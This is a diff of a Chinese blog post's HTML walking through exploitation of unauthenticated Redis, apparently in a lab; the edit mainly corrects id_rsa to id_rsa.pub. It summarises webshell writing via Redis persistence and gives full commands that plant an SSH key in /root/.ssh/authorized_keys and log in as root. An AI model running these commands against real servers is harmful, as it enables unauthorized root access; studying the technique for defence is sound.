@@ -19,16 +19,16 @@
   <meta name="author" content="清风">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Redis未授权Redis未授权有三种利用方式 redis-cli未授权连接  一、webshell写入创建一个键值对  设置持久化机制的路径和文件  手动触发持久化机制  蚁剑成功连接  二、ssh公钥写入1234567ssh-keygen -t rsa &#x2F;&#x2F;生成公钥和私钥(echo -e &quot;\n\n&quot;; cat &#x2F;home&#x2F;qfbsz&#x2F;.ssh&#x2F;id_rsa; echo -">
+    <meta name="description" content="Redis未授权Redis未授权有三种利用方式 redis-cli未授权连接  一、webshell写入创建一个键值对  设置持久化机制的路径和文件  手动触发持久化机制  蚁剑成功连接  二、ssh公钥写入1234567ssh-keygen -t rsa &#x2F;&#x2F;生成公钥和私钥(echo -e &quot;\n\n&quot;; cat &#x2F;home&#x2F;qfbsz&#x2F;.ssh&#x2F;id_rsa.pub; ec">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Redis未授权">
 <meta property="og:url" content="http://example.com/2026/01/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/index.html">
 <meta property="og:site_name" content="清风不识字">
-<meta property="og:description" content="Redis未授权Redis未授权有三种利用方式 redis-cli未授权连接  一、webshell写入创建一个键值对  设置持久化机制的路径和文件  手动触发持久化机制  蚁剑成功连接  二、ssh公钥写入1234567ssh-keygen -t rsa &#x2F;&#x2F;生成公钥和私钥(echo -e &quot;\n\n&quot;; cat &#x2F;home&#x2F;qfbsz&#x2F;.ssh&#x2F;id_rsa; echo -">
+<meta property="og:description" content="Redis未授权Redis未授权有三种利用方式 redis-cli未授权连接  一、webshell写入创建一个键值对  设置持久化机制的路径和文件  手动触发持久化机制  蚁剑成功连接  二、ssh公钥写入1234567ssh-keygen -t rsa &#x2F;&#x2F;生成公钥和私钥(echo -e &quot;\n\n&quot;; cat &#x2F;home&#x2F;qfbsz&#x2F;.ssh&#x2F;id_rsa.pub; ec">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/172.jpg">
 <meta property="article:published_time" content="2026-01-03T12:32:08.000Z">
-<meta property="article:modified_time" content="2026-01-07T07:15:45.282Z">
+<meta property="article:modified_time" content="2026-03-21T07:29:11.169Z">
 <meta property="article:author" content="清风">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/img/172.jpg">
@@ -248,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          191 字
+          192 字
         
       </span>
     
@@ -310,7 +310,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年1月7日 下午
+                    本文最后更新于 2026年3月21日 下午
                   
                 
               </p>
@@ -329,7 +329,7 @@
 <p><img src="/../../themes/fluid/source/img/photo/image-20260106202300505.png" srcset="/img/loading.gif" lazyload alt="image-20260106202300505"></p>
 <p>蚁剑成功连接</p>
 <p><img src="/../../themes/fluid/source/img/photo/image-20260106202246462.png" srcset="/img/loading.gif" lazyload alt="image-20260106202246462"></p>
-<h3 id="二、ssh公钥写入"><a href="#二、ssh公钥写入" class="headerlink" title="二、ssh公钥写入"></a>二、ssh公钥写入</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">ssh<span class="hljs-operator">-</span>keygen <span class="hljs-operator">-</span>t rsa <span class="hljs-comment">//生成公钥和私钥</span><br>(echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>; cat <span class="hljs-regexp">/home/</span>qfbsz<span class="hljs-regexp">/.ssh/</span>id_rsa; echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>) <span class="hljs-operator">&gt;</span> key.txt  <span class="hljs-comment">//保存为key.txt 防止轮嘛</span><br>cat key.txt<span class="hljs-operator">|</span> redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">190.129</span> <span class="hljs-operator">-</span>x <span class="hljs-keyword">set</span> putsshkey 以key.txt 为内容创建键值对<br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">//设置ssh的路径</span><br>config <span class="hljs-keyword">set</span> dbfilename authorized_keys   <span class="hljs-comment">//设置文件</span><br>save 触发持久化<br>ssh <span class="hljs-operator">-</span>i <span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa root@192.168.190.129   /</span><span class="hljs-operator">/</span>连接<br></code></pre></td></tr></table></figure>
+<h3 id="二、ssh公钥写入"><a href="#二、ssh公钥写入" class="headerlink" title="二、ssh公钥写入"></a>二、ssh公钥写入</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">ssh<span class="hljs-operator">-</span>keygen <span class="hljs-operator">-</span>t rsa <span class="hljs-comment">//生成公钥和私钥</span><br>(echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>; cat <span class="hljs-regexp">/home/</span>qfbsz<span class="hljs-regexp">/.ssh/</span>id_rsa.pub; echo <span class="hljs-operator">-</span>e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>) <span class="hljs-operator">&gt;</span> key.txt  <span class="hljs-comment">//保存为key.txt 防止乱码</span><br>cat key.txt<span class="hljs-operator">|</span> redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">190.129</span> <span class="hljs-operator">-</span>x <span class="hljs-keyword">set</span> putsshkey 以key.txt 为内容创建键值对<br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">//设置ssh的路径</span><br>config <span class="hljs-keyword">set</span> dbfilename authorized_keys   <span class="hljs-comment">//设置文件</span><br>save 触发持久化<br>ssh <span class="hljs-operator">-</span>i <span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa root@192.168.190.129   /</span><span class="hljs-operator">/</span>连接<br></code></pre></td></tr></table></figure>
 
 <p>生成公私钥</p>
 <p><img src="/../../themes/fluid/source/img/photo/image-20260106202538347.png" srcset="/img/loading.gif" lazyload alt="image-20260106202538347"></p>
